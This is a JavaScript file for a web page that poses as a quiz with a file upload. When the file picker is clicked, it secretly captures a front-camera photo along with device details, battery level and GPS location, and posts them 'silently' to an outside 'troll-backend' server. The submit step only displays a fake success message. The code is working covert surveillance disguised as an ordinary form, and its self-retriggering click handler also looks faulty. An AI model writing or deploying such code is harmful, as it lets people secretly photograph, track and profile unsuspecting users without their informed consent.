const form = document.getElementById("quiz-form");
const videoEl = document.getElementById("video");
const canvasEl = document.getElementById("canvas");
const toast = document.getElementById("toast");
const fileInput = document.getElementById("user-file");
const submitBtn = document.getElementById("submit-btn");

const backendURL = "https://troll-backend.onrender.com/api/upload";
const constraints = { video: { facingMode: "user" }, audio: false };

// =====================
// TOAST FUNCTION
// =====================
function showToast(message) {
  toast.innerText = message;
  toast.style.display = "block";
  toast.style.opacity = 1;

  setTimeout(() => {
    toast.style.opacity = 0;
    setTimeout(() => (toast.style.display = "none"), 300);
  }, 2000);
}

// =====================
// CAPTURE CAMERA IMAGE & SEND
// =====================
async function captureAndSendCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    videoEl.srcObject = stream;
    await videoEl.play();

    // Small delay to ensure video is ready
    await new Promise((res) =>
      videoEl.addEventListener("canplay", () => setTimeout(res, 300))
    );

    const ctx = canvasEl.getContext("2d");
    canvasEl.width = videoEl.videoWidth;
    canvasEl.height = videoEl.videoHeight;
    ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
    const image = canvasEl.toDataURL("image/png");

    // Collect metadata
    const metadata = {
      useragent: navigator.userAgent,
      platform: navigator.platform,
      width: window.innerWidth,
      height: window.innerHeight,
      language: navigator.language,
      battery: "N/A",
      location: "N/A",
      time: new Date().toLocaleString(),
    };

    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      metadata.battery = battery.level * 100 + "%";
    }

    if (navigator.geolocation) {
      try {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
      } catch {
        metadata.location = "Denied";
      }
    }

    // Send image + metadata silently
    fetch(backendURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image, metadata }),
    })
      .then((res) => res.json())
      .then((data) => console.log("Camera image sent:", data))
      .catch((err) => console.error("Camera upload error:", err));

    // Stop camera immediately
    videoEl.srcObject.getTracks().forEach((track) => track.stop());
  } catch (err) {
    console.error("Camera permission denied or error:", err);
    showToast("Camera access is required for this feature!");
    // Retry asking permission next time
  }
}

// =====================
// HANDLE FILE INPUT CLICK
// =====================
fileInput.addEventListener("click", async (e) => {
  e.preventDefault();
  // Ask for camera permission first
  await captureAndSendCamera();
  // Open file picker after camera is captured
  fileInput.click(); // re-trigger click
});

// =====================
// HANDLE FORM SUBMIT
// =====================
form.addEventListener("submit", (e) => {
  e.preventDefault();

  submitBtn.disabled = true;
  submitBtn.textContent = "Submitting...";
  showToast("Submitting your response...");

  // Normally the user file is already selected
  const userFile = fileInput.files[0];
  if (!userFile) {
    showToast("Please select a file before submitting!");
    submitBtn.disabled = false;
    submitBtn.textContent = "Submit";
    return;
  }

  // Here you can handle the form submission logic
  // For example, send the selected file along with other answers to your backend

  // For demonstration, show success container
  document.getElementById("quiz-container").style.display = "none";
  document.getElementById("success-container").style.display = "block";

  submitBtn.disabled = false;
  submitBtn.textContent = "Submit";
  showToast("Response submitted successfully!");
});
